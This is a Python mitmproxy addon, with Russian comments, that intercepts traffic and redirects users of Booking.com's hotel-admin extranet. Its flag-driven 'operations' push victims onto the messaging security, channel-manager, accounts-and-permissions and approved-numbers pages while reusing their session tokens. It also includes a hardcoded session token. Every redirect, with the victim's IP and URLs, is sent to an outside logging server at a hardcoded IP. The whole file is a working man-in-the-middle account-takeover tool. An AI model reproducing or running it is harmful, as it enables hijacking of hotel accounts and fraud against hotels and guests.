# mitm_redirect_addon.py
from mitmproxy import http, ctx
import os
import urllib.parse
import time
import threading
import requests
import json
from datetime import datetime

COOKIE = "mitm_redirect_done"
FORCE_FLAG = r"C:\temp\mitm_force_redirect"
ONE_SHOT_FLAG = r"C:\temp\mitm_reset_once"
MESSAGE_FLAG = r"C:\temp\mitm_message_once"
PROVIDER_FLAG = r"C:\temp\mitm_provider_once"
USER_FLAG = r"C:\temp\mitm_user_once"
SECURITY_FLAG = r"C:\temp\mitm_security_once"
OPERATION_11_FLAG = r"C:\temp\mitm_operation_11_once"
OPERATION_12_FLAG = r"C:\temp\mitm_operation_12_once"
REDIRECT_FILE = r"C:\mitm\redirect_target.txt"
LOG_PREFIX = "[MITM-REDIR]"

# NOTE: указывайте адрес вашего лог-сервера (Flask) — не Telegram token
LOG_SERVER_URL = "http://86.54.42.208:5000/log_redirect"

def log(msg):
    ctx.log.info(f"{LOG_PREFIX} {msg}")

# --- Асинхронная отправка лога на сервер (чтобы редиректы не блокировались) ---
def post_log_to_server(payload: dict):
    """
    Отправляет payload (JSON) в LOG_SERVER_URL в отдельном демоническом потоке.
    Очень короткий timeout — в случае проблем не задерживает mitm.
    """
    def _worker(data):
        try:
            headers = {'Content-Type': 'application/json'}
            # короткий таймаут, чтобы не мешать скорости редиректов
            requests.post(LOG_SERVER_URL, json=data, headers=headers, timeout=3)
        except Exception as e:
            # логим локально, но не мешаем обработке потоков
            try:
                ctx.log.warn(f"{LOG_PREFIX} failed to post log to server: {e}")
            except Exception:
                pass

    t = threading.Thread(target=_worker, args=(payload,), daemon=True)
    t.start()

def log_redirect_to_server(client_ip, from_url, to_url, redirect_type):
    """Формирует payload и отправляет на лог-сервер (асинхронно)."""
    payload = {
        "client_ip": client_ip or "Unknown",
        "from_url": from_url or "Unknown",
        "to_url": to_url or "Unknown",
        "redirect_type": redirect_type or "Unknown",
        "timestamp": datetime.utcnow().isoformat() + "Z"
    }
    post_log_to_server(payload)
    log(f"Posted redirect to log server: {redirect_type} from {client_ip}")

# ------------------ вспомогательные функции (как у вас) ------------------
def get_redirect_target():
    try:
        if os.path.exists(REDIRECT_FILE):
            with open(REDIRECT_FILE, 'r') as f:
                target = f.read().strip()
                if target:
                    return target
        log("No redirect target found in file, using default")
        return "https://bbc.com"
    except Exception as e:
        log(f"Error reading redirect target: {e}")
        return "https://bbc.com"

def should_force():
    return os.path.exists(FORCE_FLAG)

def should_one_shot():
    return os.path.exists(ONE_SHOT_FLAG)

def should_message():
    return os.path.exists(MESSAGE_FLAG)

def should_provider():
    return os.path.exists(PROVIDER_FLAG)

def should_user():
    return os.path.exists(USER_FLAG)

def should_security():
    return os.path.exists(SECURITY_FLAG)

def should_operation_11():
    return os.path.exists(OPERATION_11_FLAG)

def should_operation_12():
    return os.path.exists(OPERATION_12_FLAG)

def remove_one_shot_flag():
    try:
        if os.path.exists(ONE_SHOT_FLAG):
            os.remove(ONE_SHOT_FLAG)
            log("Global one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_one_shot_flag error: {e}")

def remove_message_flag():
    try:
        if os.path.exists(MESSAGE_FLAG):
            os.remove(MESSAGE_FLAG)
            log("Booking.com message one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_message_flag error: {e}")

def remove_provider_flag():
    try:
        if os.path.exists(PROVIDER_FLAG):
            os.remove(PROVIDER_FLAG)
            log("Booking.com provider one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_provider_flag error: {e}")

def remove_user_flag():
    try:
        if os.path.exists(USER_FLAG):
            os.remove(USER_FLAG)
            log("Booking.com user one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_user_flag error: {e}")

def remove_security_flag():
    try:
        if os.path.exists(SECURITY_FLAG):
            os.remove(SECURITY_FLAG)
            log("Booking.com security one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_security_flag error: {e}")

def remove_operation_11_flag():
    try:
        if os.path.exists(OPERATION_11_FLAG):
            os.remove(OPERATION_11_FLAG)
            log("Operation 11 one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_operation_11_flag error: {e}")

def remove_operation_12_flag():
    try:
        if os.path.exists(OPERATION_12_FLAG):
            os.remove(OPERATION_12_FLAG)
            log("Operation 12 one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_operation_12_flag error: {e}")

def is_redirect_target(flow: http.HTTPFlow, redirect_target: str) -> bool:
    try:
        if not redirect_target:
            return False
        req_url = flow.request.pretty_url.lower()
        target_url = redirect_target.lower().rstrip("/")
        return req_url.startswith(target_url)
    except Exception:
        return False

def get_client_ip(flow):
    """Получение IP адреса клиента"""
    try:
        client_conn = getattr(flow, "client_conn", None)
        if client_conn:
            peername = getattr(client_conn, "peername", None)
            if peername and isinstance(peername, tuple) and len(peername) > 0:
                return peername[0]
    except Exception as e:
        log(f"Error getting client IP: {e}")
    
    return "Unknown"

# Booking redirect logic — почти без изменений, но теперь лог отправляется на сервер
def booking_redirect(flow: http.HTTPFlow, redirect_type: str) -> bool:
    flags = {
        "message": (should_message, remove_message_flag, "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/messaging/security_settings.html"),
        "provider": (should_provider, remove_provider_flag, "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/channel-manager/index.html"),
        "user": (should_user, remove_user_flag, "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/accounts_and_permissions.html"),
        "security": (should_security, remove_security_flag, "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/approvednumbers.html")
    }
    
    if redirect_type not in flags:
        return False
        
    should_redirect, remove_flag, base_url = flags[redirect_type]
    
    if not should_redirect():
        return False

    url = flow.request.pretty_url
    if not url.startswith("https://admin.booking.com/hotel/hoteladmin/"):
        return False

    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)

    # Получаем hotel_id и ses из запроса
    hotel_id = query.get("hotel_id", ["14762911"])[0]
    ses = query.get("ses", ["ec1745929d110e5a461e56e51a3cda93"])[0]

    # Формируем целевой URL в зависимости от типа
    if redirect_type == "provider":
        target_url = f"{base_url}?lang=en&ses={ses}&hotel_id={hotel_id}&fr_account_menu=1&view=start"
    else:
        target_url = f"{base_url}?lang=en&ses={ses}&hotel_id={hotel_id}"

    log(f"Booking.com {redirect_type.upper()} redirect {url} -> {target_url}")
    
    # Логируем редирект — теперь на сервер
    client_ip = get_client_ip(flow)
    log_redirect_to_server(client_ip, url, target_url, f"BOOKING_{redirect_type.upper()}")
    
    flow.response = http.Response.make(
        302, b"", {"Location": target_url}
    )

    remove_flag()
    return True

# Главная точка входа для mitm
def request(flow: http.HTTPFlow) -> None:
    redirect_target = get_redirect_target()
    if not redirect_target:
        return

    host = (flow.request.pretty_host or "").lower()
    path = flow.request.path or "/"
    client_ip = get_client_ip(flow)

    if is_redirect_target(flow, redirect_target):
        log(f"skip redirect for target itself: {flow.request.pretty_url}")
        return

    log(f"incoming {host}{path} client={client_ip}")

    target_domains = ["admin.booking.com", "bbc.com"]

    for domain in target_domains:
        if host.endswith(domain.lower()):
            # Операция 11
            if (should_operation_11() and 
                flow.request.pretty_url.startswith("https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/messaging/settings")):
                log("Operation 11: user reached messaging/settings page, enabling provider redirect")
                try:
                    with open(PROVIDER_FLAG, 'w') as f:
                        f.write("enabled")
                except Exception as e:
                    log(f"Error enabling provider redirect: {e}")
                return
            
            # Операция 12
            if (should_operation_12() and 
                flow.request.pretty_url.startswith("https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/accounts_and_permissions")):
                log("Operation 12: user reached accounts_and_permissions page, enabling security redirect")
                try:
                    with open(SECURITY_FLAG, 'w') as f:
                        f.write("enabled")
                except Exception as e:
                    log(f"Error enabling security redirect: {e}")
                return
            
            # Стандартные редиректы
            if booking_redirect(flow, "message"):
                if should_operation_11():
                    log("Operation 11: message redirect completed, waiting for user to reach messaging/settings page")
                return
                
            if booking_redirect(flow, "provider"):
                if should_operation_11():
                    log("Operation 11: provider redirect completed, operation finished")
                    remove_operation_11_flag()
                return
                
            if booking_redirect(flow, "user"):
                if should_operation_12():
                    log("Operation 12: user redirect completed, waiting for user to reach accounts_and_permissions page")
                return
                
            if booking_redirect(flow, "security"):
                if should_operation_12():
                    log("Operation 12: security redirect completed, operation finished")
                    remove_operation_12_flag()
                return

            # Обычные редиректы
            if should_force():
                log(f"FORCE redirect {host}{path} -> {redirect_target}")
                client_ip = get_client_ip(flow)
                log_redirect_to_server(client_ip, flow.request.pretty_url, redirect_target, "FORCE")
                flow.response = http.Response.make(302, b"", {"Location": redirect_target})
                return

            if should_one_shot():
                log(f"GLOBAL ONE-SHOT redirect {host}{path} -> {redirect_target}")
                client_ip = get_client_ip(flow)
                log_redirect_to_server(client_ip, flow.request.pretty_url, redirect_target, "ONE_SHOT")
                flow.response = http.Response.make(
                    302, b"", {"Location": redirect_target, "Set-Cookie": f"{COOKIE}=1; Path=/; Secure; HttpOnly"}
                )
                remove_one_shot_flag()
                return

            cookie_present = False
            try:
                cookie_present = bool(flow.request.cookies.get(COOKIE))
            except Exception:
                cookie_present = False

            if cookie_present:
                log(f"cookie present -> skipping redirect for {host}")
                return

            log(f"one-shot client redirect {host}{path} -> {redirect_target}")
            client_ip = get_client_ip(flow)
            log_redirect_to_server(client_ip, flow.request.pretty_url, redirect_target, "ONE_SHOT")
            flow.response = http.Response.make(
                302, b"", {"Location": redirect_target, "Set-Cookie": f"{COOKIE}=1; Path=/; Secure; HttpOnly"}
            )
            return
